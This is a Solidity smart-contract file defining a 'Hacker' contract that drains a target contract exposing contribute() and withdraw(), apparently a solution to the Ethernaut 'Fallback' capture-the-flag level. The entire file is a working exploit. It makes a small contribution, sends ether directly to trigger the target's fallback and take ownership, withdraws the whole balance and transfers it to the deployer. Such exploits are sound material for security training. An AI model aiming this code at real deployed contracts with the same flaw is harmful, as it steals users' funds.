// SPDX-License-Identifier: MIT
pragma solidity >=0.8.5 <0.9.0;

interface FallbackInterface {
  function contribute() external payable;
  function withdraw() external;
}

contract Hacker {

  address payable public hacker;

  constructor() {
    hacker = payable(msg.sender);
  }

  modifier onlyHacker {
    require(
      msg.sender == hacker,
      "caller is not the hacker"
    );
    _;
  }

  function attack(address _target) external payable onlyHacker {
    require(
      msg.value > (0.001 ether), 
      "Not enough ether to attack."
    );

    uint contributionFee = 0.0005 ether;

    // 0. Get the target contract.
    FallbackInterface fallbackInstance = FallbackInterface(_target);

    // 1. Contribute with ether less than 0.001.
    fallbackInstance.contribute{value: contributionFee}();

    // 2. Send Transaction to claim owner, should set the gas as enough as the target contract is able to modify owner.
    (bool result,) = payable(_target).call{gas: 100000, value: address(this).balance}("");
    if (result) {
      contributionFee;
    }

    // 3. Withdraw all ether
    fallbackInstance.withdraw();

    // 4. Put back into my pocket.
    hacker.transfer(address(this).balance);
  }

  // With it, it can receive ether from the target contract.
  receive() external payable {}

}
